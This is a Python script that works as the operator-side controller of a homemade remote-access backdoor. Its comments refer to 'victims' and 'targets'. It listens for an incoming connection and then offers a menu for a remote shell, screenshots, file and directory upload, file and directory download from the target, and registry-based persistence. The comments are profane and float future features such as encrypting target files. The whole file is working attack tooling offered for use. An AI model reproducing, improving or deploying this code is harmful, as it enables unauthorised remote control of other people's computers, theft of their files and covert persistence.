# modules required for the backdoor

import socket
from colorama import Fore, Style
import sys
import os
from datetime import datetime
from zipfile import ZipFile

# below: for socket usage
ip = ''
port = 8080
sock = ''

# below: for indivitual connections and addresses
connections = ''
address = ''

# below: for image names
counter = 0


def handlSockets():
    """"
    The only function we have in this backdoor (bad programming practice using only one function to do everyhting).
    This Function will give us access to a shell, take screenshots, sending a file, sending a directory, downloading a
    file, downloading a directory, gaining persistence with the help of windows registers.
    """
    global sock  # socket object
    global ip  # for who exectuted the script
    global port  # port to listen
    global connections  # sending and receiving
    global address  # victime address
    global counter  # for image name

    try:  # CREATING  socket object
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    except socket.error as err:  # catching errors if it occured. if user used more than one socket.
        print(Fore.RED, Style.BRIGHT, '[-]: Errror Creating Socket. Error -> %s' % str(err))
        choice = str(input(f'{Fore.GREEN}{Style.BRIGHT}[*]:Retry(y,n):'))

        # prompting the user to retry.
        if choice == 'y' or choice == 'n':
            handlSockets()
        else:  # exit on no
            sys.exit(not 0)

    try:  # binding the socket
        sock.bind((ip, port))

        try:  # listening
            sock.listen()

        except socket.error as err:  # might throw an error
            print(Fore.RED, Style.BRIGHT, '[-]: Error While Listening. Error -> %s' % str(err))

    except socket.error as err:  # binding might throw error
        print(Fore.RED, Style.BRIGHT, '[-]: Error While Binding Socket. Error -> %s' % str(err))

    print(Fore.RED, Style.BRIGHT, '[-]: Listening For Connections')

    try:  # accepting connections
        connections, address = sock.accept()
        print(Fore.GREEN, Style.BRIGHT, '[+]: Connection From: %s:%d' % (address[0], int(address[1])))

    except socket.error as err:  # if error occures while accepting connections
        print(Fore.RED, Style.BRIGHT, '[-]: Error While Accepting Connections. Error -> %s' % str(err))

    # Below Handling file transfer and commands

    try:  # changing to parent directory where we are currently are
        os.chdir(os.path.dirname(os.getcwd()))

    except not IsADirectoryError as err:  # if this occureed
        print(Fore.RED, Style.BRIGHT, '[-]: Is Not A Directory Error. Errr -> %s' % str(err))

    # below: making dirs for every target
    try:  # making a directory to save every file and command in a single directory for every target
        os.makedirs(address[0])  # a new dir
        os.chdir(address[0])  # change to that dir
        print(Fore.RED, Style.BRIGHT, '[+]: Files For Target {0}Will Be Saved To -> {1}'.format(address[0],
                                                                                                os.getcwd()))

    except FileExistsError:  # if there is already exists a drectory with the smae name

        try:  # trying to change one directory back
            os.chdir(os.path.dirname(os.getcwd()))  # chaning to one directory back and creating new dirs
            os.makedirs(address[0])  # new dir
            os.chdir(address[0])  # changing to new dir
            print(Fore.GREEN, Style.BRIGHT, '[-]: Files For Target {0} Will Be Saved To -> {1}'.format(address[0],
                                                                                                       os.getcwd()))
        except FileExistsError:  # if again we face the same exception

            print(Fore.RED, Style.BRIGHT, '[-]: Please Move Folder {0} To Another Director'.format(address[0]))
            choice = str(input(f'{Fore.YELLOW}{Style.BRIGHT}[*]Delete Directory And Make A New One (y, n):'))

            if choice == 'y' or choice == 'y':

                try:
                    os.remove(address[0])  # remove the directory if user agrees
                    os.makedirs(address[0])  # make a new dir
                    os.chdir(address[0])  # change to new dir
                    print(Fore.GREEN, Style.BRIGHT,
                          '[-]: Files For Target {0} Will Be Saved To -> {1}'.format(address[0],
                                                                                     os.getcwd()))
                except PermissionError:  # if user dose not have enought premission
                    print(Fore.RED, Style.BRIGHT, '[-]: Permission Error Occured While Deleting File. Run As Root')
                    exit(not 0)

        except PermissionError:  # again if we hit permission error
            print(Fore.RED, Style.BRIGHT, '[-]: Permission Error Occured While Deleting File. Run As Root')
            exit(not 0)  # exit if low proviledges have the user

    try:

        while True:  # below is the main menu for every connection

            try:

                print(Fore.RED, Style.BRIGHT, '[*]: Commands Availiable ')
                print(Fore.GREEN, Style.BRIGHT, '[1]: ScreenShot ')
                print(Fore.GREEN, Style.BRIGHT, '[2]: Shell/shell ')
                print(Fore.GREEN, Style.BRIGHT, '[3]: Upload a file ')
                print(Fore.GREEN, Style.BRIGHT, '[4]: Upload a Directory ')
                print(Fore.GREEN, Style.BRIGHT, '[5]: Download a file ')
                print(Fore.GREEN, Style.BRIGHT, '[6]: Download directory')
                print(Fore.GREEN, Style.BRIGHT, '[7]: Persistence')

                command = str(input(f'{Fore.GREEN}{Style.BRIGHT}(root@kali)$:~ '))

                if command == 'ScreenShot' or command == 'screenshot' or command == str(1):  # if we want to take
                    # a screenshot

                    counter = counter + 1  # used for image name only
                    connections.send(str.encode(command, 'utf-8'))  # sending for target
                    complete_name = 'screenshot #' + str(counter) + '.jpg'  # for every screenshot

                    try:

                        with open(complete_name, 'wb') as screenshot:  # opening a file to save the screenshot

                            sock.settimeout(1)  # if socket timeouts
                            connections.settimeout(1)  # for receving timeout
                            buffer = connections.recv(2048)  # receive from target

                            while buffer:  # got unitl every byte is received

                                screenshot.write(buffer)  # write to opened file

                                try:
                                    buffer = connections.recv(2048)  # try to receive more if left

                                except socket.timeout:  # if timout was hit 1 second
                                    break

                        connections.settimeout(None)  # setting timemout to None
                        sock.settimeout(None)  # after it is finished receiving the
                        # image file

                        print(Fore.GREEN, Style.BRIGHT, '[+]: Screen Shot Saved To -> %s' % str(os.getcwd()))

                    except ConnectionResetError:    # target might end the connection by shutting down
                        print(Fore.RED, Style.BRIGHT, '[-----Connection----Resut-------Error-----]')
                        exit(not 0)    # exit on shutdown

                    except socket.error:
                        print(Fore.RED, Style.BRIGHT, '[-]: Connection Error.')
                        exit(not 0)

                elif command == 'exit':             # if we want to close the connections from our end
                    connections.send(str.encode('exit', 'utf-8'))
                    connections.close()    # closing conn
                    sock.close()           # closing connn
                    break                   # out of the loop

                # below: trying to run commands with limited privledges
                # the commands entered will run by other end via the subprocess module
                # when entering shell command or cmd commands you have to wait because some command outputs are
                # large and might take some time to receive their output so be patient while entering commands
                # or even worse:  you might not get your prompt babck becuase i don't know why but it happens

                elif command == 'shell' or command == 'Shell' or command == str(1):

                    time = datetime.now()       # for those who want to have time when they enterd commands
                    date = str(str(time.day) + '/' + str(time.month) + '/' + str(time.year))    # year month day
                    connections.send(str.encode('shell'))     # sending to host that we want a shell

                    while True:       # continue unitl user enters exit as the command

                        shell = str(input(f'{Fore.RED}{Style.BRIGHT}root@{Fore.GREEN}{Style.BRIGHT}elliot#:~ '
                                          f'{Fore.WHITE}'))     # for commands

                        if shell == 'exit' or shell == 'Exit':      # exit on exit kinda ryhmes
                            connections.send(str.encode('exit', 'utf-8'))     # closing connection on other end as well
                            break  # closing it safely, this exit will only exit the shell not the whole script

                        connections.send(str.encode(shell, 'utf-8'))      # sending commands to be executed by other
                        output = open('CommandOutput.txt', 'a')            # other end
                        output.write('Date -> ' + date + ' Time -> ' + str(datetime.now().hour) + ':'
                                     + str(datetime.now().minute)       # writing the ouput of the command to txt file
                                     + ':'
                                     + str(datetime.now().second) + '\n \n')

                        try:

                            data = connections.recv(10024)          # trying to recive ouput of the command
                            decoded = data.decode('utf-8')[:]       # decode the ouput  since it is in bytes
                            output.write('Command -> ' + shell + '\n' + 'Output -> ' + decoded + '\n')  # write to txt
                            print(decoded)          # show decoded to root@kali virtual terminal

                        except socket.timeout:      # when timeouts means we got the complete file so go to start
                            continue                # of the script. main menu

                # below: for uploading a single file to target machinc
                # file may be any kind of file: image, python scripts, java or ....
                # it will be recieved by other end securly not but reliably since it is TCP

                elif command == 'Upload a file' or command == 'upload a file' or command == str(3) \
                        or command == 'upload':

                    file_path = str(input(f'{Fore.GREEN}{Style.BRIGHT}[*]: File absolute path: '))
                    connections.send(str.encode('upload', 'utf-8'))

                    if os.path.exists(file_path):       # checking if file entered exists

                        try:
                            # if it exists change to that dir
                            os.chdir(os.path.dirname(file_path))

                            file_name = open(str(os.path.basename(file_path)), 'rb')        # nice way to get filename
                            connections.send(str.encode(os.path.basename(file_path), 'utf-8'))  # sending to target

                            buffer = file_name.read(1024)         # reading file from out end

                            while buffer:       # unitl we reach the end and start again

                                connections.send(buffer)        # sending 1024 bytes
                                buffer = file_name.read(1024)    # reading other chunks

                            print(Fore.RED, Style.BRIGHT, '[+]: File {0} Uploaded.'.format(os.path.basename(file_path)))
                            os.chdir(f'F:\\Programming\\Python\\{address[0]}')

                            print(Fore.RED, Style.BRIGHT, '[*]: Directory Changed To {0}'.format(os.getcwd()))

                        except FileNotFoundError:   # if file specified does not exist
                            print(Fore.RED, Style.BRIGHT, '[-]: Specifed File Not Found. Enter Full Path.')

                    else:       # not a file error:-> something like that
                        print(Fore.RED, Style.BRIGHT, '[-]: File Does Not Exist Bro')
                        print('[-]: Please Ente Absolute Path Of File To Upload.')


                # below: for uploading a list of  This part Failed could not receive it in the correct order
                # solution: first zip files then send it
                # another Bug: can't extract zipfiles at other end. becuase "unexpected end of archive"
                # below code is partial but it will send the zipfile and removes it when sent
                # can't solve this bug. Don't know why. but it can be fixed by other end using repair in winrar
                # by winrar or anyother applications for zipped files

                elif command == 'upload files' or command == 'upload directory' or command == 'upload list' \
                        or command == 'upload dir' or command == 'upload files' or command == 'Upload Files':

                    root_path = str(input(f'{Fore.GREEN}{Style.BRIGHT}[*]: Directory absolute path: '))
                    connections.send(str.encode('upload files', 'utf-8'))

                    if os.path.exists(root_path):      # if file entered is right, and exists

                        os.chdir(root_path)  # changing to root directory

                        with ZipFile('Uploads.zip', 'w', allowZip64=True) as zipko:     # creating ZipFile object

                            for bytess in os.listdir(root_path):  # first let's zip the directory

                                if bytess == 'Uploads.zip':     # skipping out own zipfile
                                    continue

                                print(Fore.LIGHTMAGENTA_EX, Style.BRIGHT, '[+]: Zipping {0}'.format(bytess))
                                zipko.write(bytess)  # writing to out zip file

                            print(Fore.RED, Style.BRIGHT, '[+]: All Files Zipped')
                            print(Fore.GREEN, Style.BRIGHT, '[*]: Sending Zipped Files')

                            reader = open('Uploads.zip', 'rb')      # reading our zip file
                            buff = reader.read(6000)        # reading out zip file for sending it to target machince

                            while buff:     # reach till the end

                                connections.send(buff)      # send it
                                buff = reader.read(6000)    # read it
                                if buff == b'':             # if not bytes lef then break out of the loop
                                    break

                        reader.close()      # closing out file descriptor allowing others to use it
                        os.remove('Uploads.zip')      # removing our zip file for straget uses

                        print()     # a line

                        print(Fore.RED, Style.BRIGHT, '[*]: Zip File {0} Sent'.format('Uploads.zip'))
                        os.chdir(f'F:\\Programming\\Python\\{address[0]}')

                        print(Fore.RED, Style.BRIGHT, '[*]: Directory Changed To {0}'.format(os.getcwd()))

                        print()     # line for comprehension

                    else:       # if directory entered dose not exist
                        print(Fore.RED, Style.BRIGHT, '[-]: Directory Not Found  Bro')
                        print('[-]: Please Ente Absolute Path Of File To Wanted Dirctory.')

                # downloading a file from out target machine
                # the file meay be of any kind: image, scripts, ajva, txt, videos and osooooooo on
                # the other end reads it and sends the bytes read to us and we write those bytes to
                # out new file. then we clse out file. thanks for your kose shair

                elif command == 'download a file' or command == 'Download a file' or command == str(5) \
                        or command == 'download' or command == 'Download' or command == 'downlad file' \
                        or command == 'Download file':      # dumb user might type anythin

                    connections.send(str.encode('download file', 'utf-8'))      # sending. fuck hate this docs

                    name = str(input(f'{Fore.RED}{Style.BRIGHT}[*]: Enter Complete File Name To Download: '))   # file
                    connections.send(str.encode(name, 'utf-8'))     # name, and sending it to send it

                    if connections.recv(30).decode('utf-8')[:] == 'exists':     # if directory mentioned exists
                        file_name = open(name, 'wb')                            # open a file for writing

                        buffer = connections.recv(1024)                         # receiving bytes 1024

                        sock.settimeout(1)                      # timeout if not bytes left and break of the loop
                        connections.settimeout(1)               # important to set timeout alot of things soved

                        while buffer:           # till the end
                            file_name.write(buffer)     # write it bitch

                            try:        # try it bitch
                                buffer = connections.recv(1024)  # receive it bithc

                            except socket.timeout:  # if timesout means we reached the end tof the file
                                break       # break out of the loop

                        print(Fore.GREEN, Style.BRIGHT, '[+]: File {0} Downloaded To {1}.'
                              .format(file_name.name, os.getcwd()))

                        file_name.close()       # closing opende file
                        sock.settimeout(None)       # setting back to normal
                        connections.settimeout(None)        # setting back to normal

                    else:
                        print(Fore.RED, Style.BRIGHT, '[-]: File {0} Does Not Exist.'.format(name))
                        print()

                # downloading a directory from the target machine. target machinge like hacker sayings right
                # first of all we zip our files and then we open it for reading in byte mode and
                # then we start reading bytes and when bytes are read we send them to here right
                # thats waht happens when we hit this command
                # nice Ashfaq nice

                elif command == 'download dir' or command == 'download dirs' or command == str(6):

                    connections.send(str.encode('download dir', 'utf-8'))       # sending the real command

                    name = str(input(f'{Fore.RED}{Style.BRIGHT}[*]: Enter Absolute Path Of The '    # name of the dir
                                     f'Directory To Download: '))

                    connections.send(str.encode(name, 'utf-8'))     # send name of the dir

                    os.makedirs('Downloads')  # directory to hold all files uploaded to victim
                    os.chdir('Downloads')   # change to that dir

                    reader = open('Downloads.zip', 'wb')    # open it in bytes mode
                    buff = connections.recv(8012)           # receive in byte mode

                    sock.settimeout(1)              # settimout solved alot of bugs
                    connections.settimeout(1)        # solved alot of bugs from line

                    while buff != b'':      # unitl we reach the end an new way of doing it

                        reader.write(buff)      # write to file

                        try:        # try to  get if left
                            buff = connections.recv(8012)

                        except socket.timeout:  # if not then what are you looking at break of the looop
                            break

                    print(Fore.GREEN, Style.BRIGHT, '[+]: Directory Download To -> %s' % str(os.getcwd()))

                    reader.close()      # close the opened file for others to use
                    sock.settimeout(None)   # back to normal
                    connections.settimeout(None)    # back to normal

                # below adding an executable backdoor in registery for persistence
                # first: making an executable file then uploading it to target machine
                # uploading it a directory than taking that path and it to registery
                # client.exe must already be in uploaded in target machine

                if command == 'persistence' or command == str(7) or command == 'Persistence':

                    connections.send(str.encode('persistence', 'utf-8'))

                    if connections.recv(1024).decode('utf-8')[:] == 'done':
                        print(Fore.GREEN, Style.BRIGHT, '[+]: BackDoor Set In Registery.')

                    elif connections.recv(1024).decode('utf-8')[:] == 'not found':
                        print(Fore.RED, Style.BRIGHT, '[-]: .exe File Not Found On Target Machine.')

                    else:
                        print(Fore.RED, Style.BRIGHT, '[-]: Failed To Set BackDoor In Registery.')

            except ConnectionAbortedError:
                print(Fore.RED, Style.BRIGHT, '[-]: Connection Aborted By Other End.')
                exit(1)

            except ConnectionResetError:
                print(Fore.RED, Style.BRIGHT, '[-]: Connection Reset By Other End.')
                exit(not 0)

            except ConnectionRefusedError:
                print(Fore.RED, Style.BRIGHT, '[-]: Other End Refuesed Connection By Other.')
                exit(not 0)

            except ConnectionError:
                print(Fore.RED, Style.BRIGHT, '[-]: Connection Error.')
                exit(not 0)

    except ConnectionAbortedError:
        print(Fore.RED, Style.BRIGHT, '[-]: Connection Aborted By Other End.')
        exit(1)

    except ConnectionResetError:
        print(Fore.RED, Style.BRIGHT, '[-]: Connection Reset By Other End.')
        exit(not 0)

    except ConnectionRefusedError:
        print(Fore.RED, Style.BRIGHT, '[-]: Other End Refuesed Connection By Other End.')
        exit(not 0)

    except ConnectionError:
        print(Fore.RED, Style.BRIGHT, '[-]: Connection Error.')
        exit(not 0)
    except KeyboardInterrupt:
        print(Fore.RED, Style.BRIGHT, '[-]: Keyboard Interrupt By You.')
        exit(not 0)

    # project ended on 15 april 2021 time -> 4:43
    # might add other features at another time but will
    # like encrypting target files, steganography.
    # want to start another book called breaking codes with python ciphers and block ciphers but
    # i will continue to make more projects, networking projects TCP proxy
    # Bye For now


handlSockets()
